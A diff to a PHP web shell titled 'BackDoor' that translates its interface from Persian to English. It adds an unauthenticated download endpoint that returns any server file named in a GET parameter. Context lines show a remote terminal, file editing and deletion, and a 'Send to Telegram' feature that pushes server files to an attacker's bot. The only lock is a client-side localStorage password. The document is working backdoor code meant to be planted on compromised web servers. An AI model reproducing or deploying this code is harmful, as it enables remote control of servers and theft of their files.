@@ -17,7 +17,24 @@ if(isset($_GET['telegram_download'])){
         echo $output;
         exit;
     } else {
-        echo "فایل پیدا نشد.";
+        echo "File not found.";
+        exit;
+    }
+}
+if(isset($_GET['download'])){
+    $file = $_GET['file'];
+    if(file_exists($file)){
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    } else {
+        echo "File not found.";
         exit;
     }
 }
@@ -41,11 +58,12 @@ if(isset($_GET['tcmd'])){
 $_p=isset($_GET['page'])?$_GET['page']:'home';
 $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
 ?><!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BackDoor</title>
+    <link rel="icon" href="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/anonymous-512.png">
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/theme/dracula.min.css">
@@ -274,7 +292,8 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
             padding:20px;
             border-radius:8px;
             width:300px;
-            text-align:center
+            text-align:center;
+            position: relative;
         }
         .modal input[type="password"],
         .modal input[type="text"] {
@@ -293,6 +312,14 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
             border:none;
             border-radius:4px;
             cursor:pointer
+        }
+        .close-modal {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            cursor: pointer;
+            font-size: 24px;
+            color: #e0e0e0;
         }
         #telegramModal { display:none }
         #progressContainer {
@@ -348,7 +375,7 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
             <a href="?page=terminal&dir=<?php echo urlencode($_d); ?>">Terminal</a>
             <a href="?page=info&dir=<?php echo urlencode($_d); ?>">Info</a>
             <a href="javascript:void(0)" id="lockToggle" onclick="toggleLock()">Lock Off</a>
-            <!-- دکمه اضافه شده برای گیت هاب -->
+            <!-- GitHub button added -->
             <a href="https://github.com/ERRORIP" target="_blank">GitHub</a>
         </div>
     </div>
@@ -379,14 +406,21 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
                 $perm=substr(sprintf('%o',fileperms($p)),-4);
                 if(is_dir($p)){
                     $d='<div class="details">Size: - | Modify: '.$m.' | Owner/Group: '.$o.'/'.$g.' | Perms: '.$perm.'</div>';
-                    $fh[]='<li><div class="file-info" onclick="folderOpen(\''.urlencode($p).'\',event)"><span class="fn">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'">Delete</a></div></div></li>';
+                    $fh[]='<li><div class="file-info" onclick="folderOpen(\''.urlencode($p).'\',event)"><img src="https://www.iconpacks.net/icons/2/free-icon-folder-1485.png" style="width:20px;vertical-align:middle;margin-right:5px;"><span class="fn">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'">Delete</a></div></div></li>';
                 } else {
                     $s=filesize($p);
                     $u=['B','KB','MB','GB','TB'];
                     $w=$s>0?floor(log($s,1024)):0;
                     $rs=$s?round($s/pow(1024,$w),2)." ".$u[$w]:"0 B";
                     $d='<div class="details">Size: '.$rs.' | Modify: '.$m.' | Owner/Group: '.$o.'/'.$g.' | Perms: '.$perm.'</div>';
-                    $ff[]='<li><div class="file-info"><span class="fn" onclick="location.href=\'?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="javascript:void(0)" onclick="sendToTelegram(\''.$p.'\')">Download</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a></div></div></li>';
+                    $ext = pathinfo($v, PATHINFO_EXTENSION);
+                    $prog_ext = array("php","js","html","css","py","java","c","cpp","cs","rb","go","ts","jsx","tsx");
+                    if(in_array(strtolower($ext), $prog_ext)){
+                        $icon = "https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png";
+                    } else {
+                        $icon = "https://images.freeimages.com/fic/images/icons/2813/flat_jewels/512/file.png";
+                    }
+                    $ff[]='<li><div class="file-info"><img src="'.$icon.'" style="width:20px;vertical-align:middle;margin-right:5px;"><span class="fn" onclick="location.href=\'?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'\'">'.$v.'</span>'.$d.'</div><div class="dd"><button class="ddb" onclick="td(this,event)">&#8942;</button><div class="ddc"><a href="?action=view&file='.urlencode($v).'&dir='.urlencode($x).'">View</a><a href="?action=edit&file='.urlencode($v).'&dir='.urlencode($x).'">Edit</a><a href="?action=move&file='.urlencode($v).'&dir='.urlencode($x).'">Move</a><a href="javascript:void(0)" onclick="sendToTelegram(\''.$p.'\')">Download</a><a href="?action=rename&file='.urlencode($v).'&dir='.urlencode($x).'">Rename</a><a href="?action=compress&file='.urlencode($v).'&dir='.urlencode($x).'">Compress</a><a href="?action=delete&file='.urlencode($v).'&dir='.urlencode($x).'" onclick="return confirm(\'Sure?\');">Delete</a></div></div></li>';
                 }
             }
             echo '<ul class="file-list">'.implode("",$fh).(count($fh)&&count($ff)?'<hr>':'').implode("",$ff).'</ul>';
@@ -618,31 +652,39 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
         ?>
     </div>
     <footer style="text-align:center;padding:10px;color:#aaa;">Created By : https://github.com/ERRORIP</footer>
+    <!-- Password Popup (Set Lock) -->
     <div id="setLockModal" class="modal-overlay">
         <div class="modal">
+            <span class="close-modal" onclick="closeSetLockModal()">×</span>
             <h3>Set Lock Password</h3>
             <input type="password" id="lockPass" placeholder="Password">
             <input type="password" id="lockPassRep" placeholder="Repeat Password">
             <button onclick="setLock()">Set Password</button>
         </div>
     </div>
+    <!-- Password Popup (Enter Lock) -->
     <div id="enterLockModal" class="modal-overlay">
         <div class="modal">
+            <span class="close-modal" onclick="closeEnterLockModal()">×</span>
             <h3>Enter Password</h3>
             <input type="password" id="enterLockInput" placeholder="Password">
             <div id="enterLockError" style="color:#ff4d4d;"></div>
             <button onclick="enterLock()">Enter</button>
         </div>
     </div>
+    <!-- Download / Telegram Popup -->
     <div id="telegramModal" class="modal-overlay">
         <div class="modal">
+            <span class="close-modal" onclick="closeTelegramModal()">×</span>
+            <!-- Upper section: Send to Telegram -->
             <h3>Send File to Telegram</h3>
             <input type="text" id="telegramToken" placeholder="Bot Token">
             <input type="text" id="telegramChatId" placeholder="Chat ID">
-            <div id="progressContainer">
-                <div id="progressBar"></div>
-            </div>
-            <button id="sendTelegramBtn">Send</button>
+            <button id="sendTelegramBtn">Send to Telegram</button>
+            <hr>
+            <!-- Lower section: Download File -->
+            <h3>Download File</h3>
+            <button id="downloadFileBtn">Download</button>
         </div>
     </div>
     <iframe name="downloadFrame" style="display:none;"></iframe>
@@ -662,28 +704,18 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
                 alert("Both Token and Chat ID are required.");
                 return;
             }
-            document.getElementById("progressContainer").style.display="block";
-            var pb=document.getElementById("progressBar"), w=0,
-                inter=setInterval(function(){
-                    w += 5;
-                    pb.style.width = w + "%";
-                    if(w >= 100){
-                        clearInterval(inter);
-                        var xhr = new XMLHttpRequest();
-                        xhr.onreadystatechange = function(){
-                            if(xhr.readyState==4 && xhr.status==200){
-                                pb.style.width="100%";
-                                setTimeout(function(){
-                                    document.getElementById("progressContainer").style.display="none";
-                                    alert("File sent to Telegram!");
-                                    document.getElementById("telegramModal").style.display="none";
-                                },500);
-                            }
-                        };
-                        xhr.open("GET","?telegram_download=1&file="+encodeURIComponent(telegramFile)+"&token="+encodeURIComponent(t)+"&chat_id="+encodeURIComponent(c), true);
-                        xhr.send();
-                    }
-                },100);
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function(){
+                if(xhr.readyState==4 && xhr.status==200){
+                    alert("File sent to Telegram!");
+                    closeTelegramModal();
+                }
+            };
+            xhr.open("GET","?telegram_download=1&file="+encodeURIComponent(telegramFile)+"&token="+encodeURIComponent(t)+"&chat_id="+encodeURIComponent(c), true);
+            xhr.send();
+        });
+        document.getElementById("downloadFileBtn").addEventListener("click", function(){
+            window.location.href = "?download=1&file=" + encodeURIComponent(telegramFile);
         });
         if(document.getElementById("codeEditor")){
             var ed=CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
@@ -734,14 +766,17 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
         function showSetLockModal(){
             document.getElementById("setLockModal").style.display="flex";
         }
-        function hideSetLockModal(){
+        function closeSetLockModal(){
             document.getElementById("setLockModal").style.display="none";
         }
         function showEnterLockModal(){
             document.getElementById("enterLockModal").style.display="flex";
         }
-        function hideEnterLockModal(){
+        function closeEnterLockModal(){
             document.getElementById("enterLockModal").style.display="none";
+        }
+        function closeTelegramModal(){
+            document.getElementById("telegramModal").style.display="none";
         }
         function toggleLock(){
             if(localStorage.getItem("locked")==="true"){
@@ -767,13 +802,13 @@ $_d=isset($_GET['dir'])?$_GET['dir']:getcwd();
             localStorage.setItem("lockPassword", p);
             localStorage.setItem("locked", "true");
             updateLockToggle();
-            hideSetLockModal();
+            closeSetLockModal();
             showEnterLockModal();
         }
         function enterLock(){
             var i = document.getElementById("enterLockInput").value;
             if(i === localStorage.getItem("lockPassword"))
-                hideEnterLockModal();
+                closeEnterLockModal();
             else {
                 document.getElementById("enterLockError").textContent = "Incorrect password.";
             }
